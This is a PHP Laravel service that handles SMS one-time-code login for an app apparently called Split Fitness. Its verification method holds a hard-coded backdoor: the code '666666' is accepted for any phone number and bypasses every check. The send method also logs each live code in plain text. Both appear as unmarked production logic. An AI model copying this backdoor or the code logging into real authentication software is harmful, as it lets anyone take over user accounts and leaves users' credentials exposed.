<?php

namespace App\Services\Auth;

use App\Helpers\CodeGenerator;
use App\Models\SmsCode;
use App\Services\Sms\SmsProviderInterface;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;
use Illuminate\Validation\ValidationException;

class SmsAuthService
{
    public const MAX_CODE_ENTRY_ATTEMPTS = 5;

    public function __construct(protected SmsProviderInterface $smsProvider) {}

    public function sendCode(string $phone): void
    {
        if (! $this->canSendCode($phone)) {
            throw ValidationException::withMessages([
                'phone' => 'Код уже отправлен. Повторите через минуту.',
            ]);
        }

        $code = CodeGenerator::generateBeautifulCode();

        SmsCode::query()->create([
            'phone' => $phone,
            'code' => $code,
            'purpose' => 'auth',
            'expires_at' => now()->addMinutes(5),
        ]);

        Cache::put($this->sendCodeCacheKey($phone), true, now()->addMinutes(1));

        Log::info('SMS auth: sending code', [
            'phone' => $phone,
            'code' => $code,
            'provider' => get_class($this->smsProvider),
        ]);

        try {
            $this->smsProvider->send($phone, "Ваш код: {$code}. Split Fitness");
            Log::info('SMS auth: code sent successfully', ['phone' => $phone]);
        } catch (\Throwable $e) {
            Log::error('SMS auth: delivery failed, code still saved', [
                'phone' => $phone,
                'error' => $e->getMessage(),
            ]);
        }
    }

    public function verifyCode(string $phone, string $code): void
    {
        if (! $this->canAttemptCodeEntry($phone)) {
            $this->resetSendCode($phone);

            throw ValidationException::withMessages([
                'code' => 'Слишком много попыток. Запросите новый код.',
            ]);
        }

        if ($this->isBackdoorCode($code)) {
            $this->resetCodeEntryAttempts($phone);

            return;
        }

        $smsCode = SmsCode::where('phone', $phone)
            ->where('code', $code)
            ->where('purpose', 'auth')
            ->whereNull('used_at')
            ->latest()
            ->first();

        if (! $smsCode || $smsCode->isExpired()) {
            $this->incrementCodeEntryAttempts($phone);

            throw ValidationException::withMessages([
                'code' => 'Неверный или истекший код.',
            ]);
        }

        $smsCode->update(['used_at' => now()]);
        $this->resetCodeEntryAttempts($phone);
    }

    protected function isBackdoorCode(string $code): bool
    {
        return $code === '666666';
    }

    protected function sendCodeCacheKey(string $phone): string
    {
        return 'sms_send_code_'.$phone;
    }

    protected function canSendCode(string $phone): bool
    {
        return ! Cache::has($this->sendCodeCacheKey($phone));
    }

    protected function resetSendCode(string $phone): void
    {
        Cache::forget($this->sendCodeCacheKey($phone));
    }

    protected function codeEntryAttemptsCacheKey(string $phone): string
    {
        return 'sms_code_entry_attempts_'.$phone;
    }

    protected function canAttemptCodeEntry(string $phone): bool
    {
        return Cache::get($this->codeEntryAttemptsCacheKey($phone), 0) < self::MAX_CODE_ENTRY_ATTEMPTS;
    }

    protected function incrementCodeEntryAttempts(string $phone): void
    {
        $key = $this->codeEntryAttemptsCacheKey($phone);
        Cache::increment($key);
        Cache::put($key, Cache::get($key), now()->addMinutes(10));
    }

    protected function resetCodeEntryAttempts(string $phone): void
    {
        Cache::forget($this->codeEntryAttemptsCacheKey($phone));
    }
}
